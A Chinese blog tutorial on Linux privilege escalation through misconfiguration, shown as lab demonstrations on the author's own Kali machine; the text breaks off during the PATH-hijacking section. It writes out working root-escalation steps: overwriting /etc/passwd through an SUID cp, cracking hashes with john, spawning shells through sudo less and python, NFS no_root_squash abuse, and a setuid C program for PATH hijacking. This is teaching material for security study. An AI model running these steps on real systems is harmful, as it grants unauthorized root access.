<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Linux提权总结 · zIxyd's Blog</title><meta name="description" content="前言记录一些常见的非漏洞(配置不当)提权笔记；还有一些linux内核版本可能会产生漏洞需要自行google.
suid提权
只对可执行文件生效，任何用户执行该文件都是以文件所属者身份运行的。
SUID（Set User ID）是一种权限位，用于在执行文件时暂时将进程的有效用户 ID 更改为文件所有者"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toclist-text">suid提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#find"><span class="toclist-text">find</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#cp"><span class="toclist-text">cp</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85%E4%B8%80%E4%B8%8B"><span class="toclist-text">补充一下</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toclist-text">sudo提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="toclist-text">NFS提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PATH%E6%8F%90%E6%9D%83"><span class="toclist-text">PATH提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#LD-PRELOAD%E6%8F%90%E6%9D%83"><span class="toclist-text">LD_PRELOAD提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#cronjobs%E6%8F%90%E6%9D%83"><span class="toclist-text">cronjobs提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96"><span class="toclist-text">文件覆盖</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toclist-text">通配符注入</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#docker%E6%8F%90%E6%9D%83"><span class="toclist-text">docker提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#capability%E6%8F%90%E6%9D%83"><span class="toclist-text">capability提权</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toclist-text">suid提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#find"><span class="toclist-text">find</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#cp"><span class="toclist-text">cp</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85%E4%B8%80%E4%B8%8B"><span class="toclist-text">补充一下</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toclist-text">sudo提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="toclist-text">NFS提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PATH%E6%8F%90%E6%9D%83"><span class="toclist-text">PATH提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#LD-PRELOAD%E6%8F%90%E6%9D%83"><span class="toclist-text">LD_PRELOAD提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#cronjobs%E6%8F%90%E6%9D%83"><span class="toclist-text">cronjobs提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96"><span class="toclist-text">文件覆盖</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toclist-text">通配符注入</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#docker%E6%8F%90%E6%9D%83"><span class="toclist-text">docker提权</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#capability%E6%8F%90%E6%9D%83"><span class="toclist-text">capability提权</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Linux提权总结</a></h3></div><div class="post-content"><p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一些常见的非漏洞(配置不当)提权笔记；还有一些linux内核版本可能会产生漏洞需要自行google.</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><ul>
<li>只对可执行文件生效，任何用户执行该文件都是以文件所属者身份运行的。</li>
<li>SUID（Set User ID）是一种权限位，用于在执行文件时暂时将进程的有效用户 ID 更改为文件所有者的用户 ID。它是一种特殊权限设置，可让非特权用户以超级用户权限运行具有 SUID 标志的可执行文件。</li>
</ul>
<p>查找具有s权限的二进制文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>做一个实验使得<code>find</code>命令有<code>s</code>权限，来提权、</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ whoami</span><br><span class="line">kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ which find</span><br><span class="line">/usr/bin/find</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ls -l /usr/bin/find</span><br><span class="line">-rwxr-xr-x 1 root root 224848  7月 2日 13:26 /usr/bin/find</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo chmod u+s /usr/bin/find</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ls -l /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 224848  7月 2日 13:26 /usr/bin/find</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">由rwx变成了rws</span></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ find /etc/passwd -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h4 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h4><p>做一个实验使得<code>cp</code>命令有<code>s</code>权限，来提权、当然不止于<code>find</code>,<code>cp</code>命令，可以参考这个网址：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">click me</a></p>
<p>当cp有suid权限时，可以改写只能root访问的文件，比如<code>/etc/passwd</code>或<code>/etc/shadow</code>中的内容</p>
<p>首先用openssl生成一个密码，passwd参数表示生成一个密码，-1表示md5,-salk表示盐(随意指定)，最后跟要加密的值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ openssl passwd -1 -salt 1 123abc               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$1<span class="variable">$dzqAUU</span>/vB2clNL4EHnbXq0</span></span><br></pre></td></tr></table></figure>

<p>然后往<code>/etc/passwd</code>文件中添加一个新用户，用户名随意取，密码不要用<code>x</code>,要用我们上面生成的密码，其他的按照root的写即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo chmod u+s /usr/bin/cp                                                                                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -l /usr/bin/cp  </span><br><span class="line">-rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp                                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cp /etc/passwd ./                                                                                                                                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ vim passwd                                                                                                      </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在最后添加一行:<span class="built_in">test</span>:$1$1<span class="variable">$dzqAUU</span>/vB2clNL4EHnbXq0:0:0:root:/root:/usr/bin/zsh</span></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cp ./passwd /etc/passwd                                                                                                                                                                                           </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ su test                   </span><br><span class="line">密码： 			 #这里输入之前openssl加密的 &#x27;123abc&#x27;</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─#           		#提权成功</span><br></pre></td></tr></table></figure>

<p>去修改<code>/etc/sudoers</code>应该简单点</p>
<h4 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h4><p>linux的shadow文件中的第二个字段保存了加密后的密码，加密数据的格式为 $type$salt$encrypted，其中type是提示符，salt是随机生成的字符串，encrypted是明文密码和salt通过crypt函数加密后的结果。在加密数据中的提示符type用来标识采用了哪种加密方式，这样的标识符有以下几种：</p>
<p>1 代表采用了MD5加密方式<br>2 Blowfish，是最早的版本，有一些缺陷，不推荐使用<br>2a Blowfish，是修复了一些缺陷后的版本，但仍然有一些问题，不推荐使用<br>2b Blowfish，是修复了2a中的问题后的版本，是安全、常用的版本<br>2y Blowfish，Eksblowfish版本<br>y 是Yescrypt加密方式的前缀，是Blowfish加密方式的一个变种，提供了更高的安全性和性能<br>5 代表采用了SHA256加密方式<br>6 代表采用了SHA512加密方式</p>
<p>在线哈希识别器：<a target="_blank" rel="noopener" href="https://hashes.com/en/tools/hash_identifier">click me</a></p>
<p><code>/etc/shadow</code>中的密码可以用<code>john</code>工具(kali自带)破解，能不能破解成功取决于你的dict。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ echo &quot;\$1\$1\$dzqAUU/vB2clNL4EHnbXq0&quot; &gt; hash</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br><span class="line">Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">123abc           (?)      #这里成功破解出密码为&#x27;123abc&#x27;</span><br><span class="line">1g 0:00:00:00 DONE (2023-12-05 12:53) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里需要说明一下，john不会破解之前已经破解过的密文，可以使用命令查看之前破解的密文</span></span><br><span class="line"></span><br><span class="line">方法一</span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat /home/kali/.john/john.pot</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$1<span class="variable">$dzqAUU</span>/vB2clNL4EHnbXq0:123abc</span></span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ john --show hash                                     </span><br><span class="line">?:123abc</span><br></pre></td></tr></table></figure>

<p>当然john还有很多用法,比如破解受密码保护的Zip压缩文件，我不一一记录; 可以参考 <a target="_blank" rel="noopener" href="https://openwall.info/wiki/john">官方Wiki</a></p>
<p>再docker中<code>su username</code>,可能会报<code>must be run from terminal</code>;解决方案：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">clink me</a></p>
<p>用的比较多的解决方案：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>





<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p><code>sudo</code>提权基本离不开<code>/etc/sudoers</code>文件，</p>
<p><code>/etc/sudoers</code>文件是一个用于配置<code>sudo</code>命令的文件，它定义了哪些用户或用户组有权利以root用户的权限来执行特定的命令。这个文件通常位于Linux系统中的&#x2F;etc目录下。sudoers文件的内容可以指定哪些用户可以以root用户的权限执行哪些命令，以及是否需要输入密码等安全设置。编辑sudoers文件需要特殊的权限，并且通常使用visudo命令来进行编辑，以确保在保存文件时能够检查语法错误，以避免导致系统安全性问题。</p>
<p>假如我们（root用户）要给普通用户test分配sudo权限，请输出<code>vim /etc/sudoers</code>打开文件进行编辑，找到root权限<code>root ALL=(ALL:ALL) ALL</code>，在下一行输入<code>test ALL(ALL:ALL) NOPASSWD:ALL</code>，保存后退出，这样即表示用户test可以使用sudo调用root权限执行命令。</p>
<p><code>/etc/sudoers</code>也可以指定用户执行指定的sudo命令</p>
<p><code>test ALL(ALL:ALL) /usr/bin/ls</code>,但是这样还是得输入密码才能执行，也可以配置不需要密码：<code>test ALL(ALL:ALL) NOPASSWD:/usr/bin/ls</code>,</p>
<p>在Vim中，当你输入:!&#x2F;bin&#x2F;bash并按下回车时，Vim会执行你输入的命令，其中!表示执行外部命令的意思。因此，Vim会启动一个新的shell进程并执行&#x2F;bin&#x2F;bash。这是Vim的一个功能，允许用户在编辑器中执行外部命令,当然<code>vim</code>，只是sudo提权命令之一，还有很多其他的命令，比如：less,python等等，可以参考上面那个网站</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo vim /etc/sudoers</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加zixyd   ALL=(ALL:ALL) NOPASSWD:/usr/bin/less</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wp!保存退出</span></span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─$ sudo -ll</span><br><span class="line">匹配 kali 上 zixyd 的默认条目：</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">用户 zixyd 可以在 kali 上运行以下命令：</span><br><span class="line"></span><br><span class="line">Sudoers 条目：</span><br><span class="line">    RunAs 用户：ALL</span><br><span class="line">    RunAs 组：ALL</span><br><span class="line">    选项：!authenticate</span><br><span class="line">    命令：</span><br><span class="line">        /usr/bin/less</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到zixyd用户</span></span><br><span class="line">┌──(zixyd㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─$ sudo less /etc/passwd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接输入!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提权成功</span></span><br><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─# </span><br></pre></td></tr></table></figure>



<p>再试试<code>python</code>,在<code>/etc/sudoers</code>中添加<strong>zixyd   ALL&#x3D;(ALL:ALL) NOPASSWD:&#x2F;usr&#x2F;bin&#x2F;less,&#x2F;usr&#x2F;bin&#x2F;python</strong>,</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─$ sudo python -c &quot;import os;os.system(&#x27;/bin/sh&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span> </span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
<p>首先安装nfs服务端：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-kernel-server</span><br></pre></td></tr></table></figure>

<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nfs通过rpc通信，这里把rpcbind也重启下</span></span><br><span class="line">sudo /etc/init.d/rpcbind restart</span><br><span class="line">sudo /etc/init.d/nfs-kernel-server restart</span><br></pre></td></tr></table></figure>

<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e ip</span><br></pre></td></tr></table></figure>

<p><strong>NFS配置不当可提权</strong></p>
<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/abasdf.png"></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。</p>
<p>p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/640%20(1).png"></p>
<p>使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p><strong>其它命令</strong></p>
<p>除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。</p>
<p>例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。</p>
<h3 id="PATH提权"><a href="#PATH提权" class="headerlink" title="PATH提权"></a>PATH提权</h3><p>Linux中的<code>PATH</code>是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p>
<p>首先编译以下c代码，这里用<code>whoami</code>命令来做实验,<code>gcc shell.c -o whoami_shell </code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ gcc ./shell.c -o whoami_shell                                                          </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -l ./whoami_shell</span><br><span class="line">-rwxr-xr-x 1 kali kali 16056 12月 7日 19:19 ./whoami_shell</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./whoami_shell             </span><br><span class="line">kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo chown root ./whoami_shell         #改变所有者为root                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ll whoami_shell     </span><br><span class="line">-rwxr-xr-x 1 root kali 16056 12月 7日 19:19 whoami_shell</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo chmod u+s ./whoami_shell                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./whoami_shell</span><br><span class="line">root</span><br></pre></td></tr></table></figure>



<p>利用：到tmp目录下，把bash写到一个<code>whoami</code>文件中，然后<strong>修改PATH变量添加tmp目录</strong>，再去执行shell，就会获得一个root权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cd /tmp                                      </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ echo &quot;/bin/bash&quot; &gt; whoami</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ ls                  </span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ echo $PATH               </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ export PATH=/tmp:$PATH</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ echo $PATH            </span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ chmod +x /tmp/whoami  #还要给可执行权限</span><br><span class="line"></span><br><span 